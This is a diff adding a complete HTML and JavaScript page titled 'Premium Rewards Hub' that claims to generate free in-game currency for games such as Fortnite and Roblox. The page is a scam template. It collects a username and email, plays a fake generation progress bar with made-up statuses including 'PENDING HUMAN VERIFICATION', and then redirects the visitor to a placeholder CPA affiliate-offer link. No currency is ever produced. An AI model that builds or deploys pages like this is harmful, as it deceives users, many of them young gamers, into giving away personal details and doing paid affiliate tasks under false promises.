@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProTech | Premium Rewards Hub</title>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0b10;
+            --card: #12141c;
+            --accent: #007aff;
+            --accent-glow: rgba(0, 122, 255, 0.3);
+            --border: #1e293b;
+            --text-secondary: #94a3b8;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 20px 0;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header-section h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 20px;
+        }
+
+        .game-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            transition: 0.3s;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .game-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 122, 255, 0.15);
+        }
+
+        .game-card i.currency-icon {
+            font-size: 2.5rem;
+            color: #ffd700;
+            margin-bottom: 15px;
+            display: block;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .game-card h3 {
+            margin: 10px 0;
+            font-size: 1.1rem;
+            font-family: 'Space Grotesk';
+        }
+
+        .game-card .reward-type {
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            display: block;
+            margin-bottom: 15px;
+        }
+
+        .claim-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+
+        .claim-btn:hover {
+            opacity: 0.9;
+            box-shadow: 0 0 15px var(--accent);
+        }
+
+        /* تصميم صفحة الهبوط المنبثقة (Popup) */
+        #landingPopup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 11, 16, 0.98);
+            z-index: 10000;
+            backdrop-filter: blur(10px);
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        .popup-content {
+            background: var(--card);
+            border: 1px solid var(--accent);
+            width: 90%;
+            max-width: 450px;
+            border-radius: 24px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 0 50px rgba(0, 122, 255, 0.2);
+            margin: 20px auto;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: #0a0b10;
+            color: white;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: var(--accent);
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 6px;
+            background: #1e293b;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: var(--accent);
+            box-shadow: 0 0 15px var(--accent);
+        }
+
+        .status-text {
+            color: var(--accent);
+            font-weight: bold;
+            font-size: 0.8rem;
+            display: none;
+        }
+
+        .close-popup {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: var(--text-secondary);
+            cursor: pointer;
+        }
+
+        @media (max-width: 600px) {
+            .games-grid { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header-section">
+        <a href="index.html" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;"><i class="fas fa-arrow-left"></i> Back to Tech News</a>
+        <h1>Global Rewards Hub</h1>
+        <p style="color: var(--text-secondary);">Select a game to generate your digital assets</p>
+    </div>
+
+    <div class="games-grid" id="gamesGrid"></div>
+</div>
+
+<div id="landingPopup">
+    <div class="popup-content">
+        <i class="fas fa-times close-popup" onclick="closePopup()"></i>
+        <div id="popupIcon" style="font-size: 3rem; margin-bottom: 15px;"></div>
+        <h2 id="popupTitle" style="margin-bottom: 5px; font-family: 'Space Grotesk';">Game Name</h2>
+        <p id="popupDesc" style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 25px;">Enter details to start generation</p>
+        
+        <div id="userForm">
+            <div class="input-group">
+                <label>Username / ID</label>
+                <input type="text" id="username" placeholder="e.g. Gamer777">
+            </div>
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="name@example.com">
+            </div>
+            <div class="input-group">
+                <label>Amount of <span id="amountLabel">Resources</span></label>
+                <select id="amount">
+                    <option value="1000">1,000 (Basic)</option>
+                    <option value="5000">5,000 (Popular)</option>
+                    <option value="10000">10,000 (Extreme)</option>
+                    <option value="50000">50,000 (Ultimate)</option>
+                </select>
+            </div>
+            <button class="claim-btn" onclick="processRequest()">CONFIRM & GENERATE</button>
+        </div>
+
+        <div class="loading-bar" id="loadingBar">
+            <div class="progress" id="progressBar"></div>
+        </div>
+        <div class="status-text" id="statusText">INITIALIZING...</div>
+
+        <div id="finalStep" style="display: none; margin-top: 10px;">
+            <p style="color: #4ade80; font-size: 0.9rem; margin-bottom: 15px; font-weight: bold;">Step 2: Complete the final tasks to release the funds!</p>
+            <button class="claim-btn" onclick="redirectToCPA()" style="padding: 15px; background: #4ade80;">COMPLETE TASKS NOW</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const games = [
+        { name: "Fortnite", currency: "V-Bucks", icon: "fa-solid fa-v" },
+        { name: "Roblox", currency: "Robux", icon: "fa-solid fa-r" },
+        { name: "Free Fire", currency: "Diamonds", icon: "fa-solid fa-gem" },
+        { name: "PUBG Mobile", currency: "UC Cash", icon: "fa-solid fa-coins" },
+        { name: "Call of Duty", currency: "CP Points", icon: "fa-solid fa-shield-halved" },
+        { name: "Minecraft", currency: "Minecoins", icon: "fa-solid fa-cube" },
+        { name: "Apex Legends", currency: "Apex Coins", icon: "fa-solid fa-triangle-exclamation" },
+        { name: "Valorant", currency: "VP Points", icon: "fa-solid fa-v" },
+        { name: "League of Legends", currency: "RP Points", icon: "fa-solid fa-l" },
+        { name: "Genshin Impact", currency: "Primogems", icon: "fa-solid fa-star" },
+        { name: "Brawl Stars", currency: "Gems", icon: "fa-solid fa-clover" },
+        { name: "Clash of Clans", currency: "Gems", icon: "fa-solid fa-fire" },
+        { name: "Mobile Legends", currency: "Diamonds", icon: "fa-solid fa-diamond" },
+        { name: "EA FC 25", currency: "FC Points", icon: "fa-solid fa-circle-play" },
+        { name: "GTA V Online", currency: "Shark Cards", icon: "fa-solid fa-money-bill-1" },
+        { name: "Pokemon GO", currency: "PokeCoins", icon: "fa-solid fa-circle-dot" },
+        { name: "Among Us", currency: "Stars", icon: "fa-solid fa-wand-magic-sparkles" },
+        { name: "Clash Royale", currency: "Gems", icon: "fa-solid fa-crown" },
+        { name: "Counter-Strike 2", currency: "Skins/Cases", icon: "fa-solid fa-gun" },
+        { name: "Overwatch 2", currency: "OW Coins", icon: "fa-solid fa-burst" }
+    ];
+
+    const grid = document.getElementById('gamesGrid');
+    games.forEach(game => {
+        grid.innerHTML += `
+            <div class="game-card" onclick="openLanding('${game.name}', '${game.currency}', '${game.icon}')">
+                <i class="${game.icon} currency-icon"></i>
+                <h3>${game.name}</h3>
+                <span class="reward-type">Free ${game.currency}</span>
+                <button class="claim-btn">GENERATE</button>
+            </div>
+        `;
+    });
+
+    let currentCpaUrl = "رابط_شركة_CPA_الخاص_بك_هنا";
+
+    function openLanding(name, currency, icon) {
+        document.getElementById('landingPopup').style.display = 'flex';
+        document.getElementById('popupTitle').innerText = name;
+        document.getElementById('amountLabel').innerText = currency;
+        document.getElementById('popupIcon').innerHTML = `<i class="${icon}" style="color: #ffd700;"></i>`;
+        document.getElementById('userForm').style.display = 'block';
+        document.getElementById('loadingBar').style.display = 'none';
+        document.getElementById('statusText').style.display = 'none';
+        document.getElementById('finalStep').style.display = 'none';
+    }
+
+    function processRequest() {
+        const user = document.getElementById('username').value;
+        const mail = document.getElementById('email').value;
+
+        if(!user || !mail) {
+            alert("Please fill in your details!");
+            return;
+        }
+
+        document.getElementById('userForm').style.display = 'none';
+        document.getElementById('loadingBar').style.display = 'block';
+        document.getElementById('statusText').style.display = 'block';
+        
+        startProgress();
+    }
+
+    function startProgress() {
+        let step = 0;
+        const bar = document.getElementById('progressBar');
+        const status = document.getElementById('statusText');
+        const final = document.getElementById('finalStep');
+        
+        const interval = setInterval(() => {
+            step += Math.random() * 10;
+            if (step > 100) step = 100;
+            bar.style.width = step + '%';
+
+            if (step < 25) status.innerText = "FINDING USER: " + document.getElementById('username').value.toUpperCase();
+            else if (step < 50) status.innerText = "PREPARING REWARD PACKS...";
+            else if (step < 80) status.innerText = "ENCRYPTING DATA...";
+            else status.innerText = "PENDING HUMAN VERIFICATION!";
+
+            if (step === 100) {
+                clearInterval(interval);
+                final.style.display = 'block';
+            }
+        }, 300);
+    }
+
+    function closePopup() {
+        document.getElementById('landingPopup').style.display = 'none';
+    }
+
+    function redirectToCPA() {
+        window.location.href = currentCpaUrl;
+    }
+</script>
+
+</body>
+</html>
